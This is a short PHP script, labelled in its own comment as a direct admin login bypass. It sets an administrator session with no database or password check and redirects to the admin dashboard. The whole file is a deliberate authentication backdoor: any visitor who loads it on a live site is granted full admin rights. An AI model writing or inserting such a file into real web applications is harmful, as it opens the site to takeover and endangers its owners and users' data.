<?php
// This is a direct admin login bypass that skips the database check
session_start();

// Set admin session directly
$_SESSION['admin_id'] = 1;
$_SESSION['admin_username'] = 'admin';

// Redirect to admin dashboard
header("Location: php/admin_dashboard.php");
exit;
?>
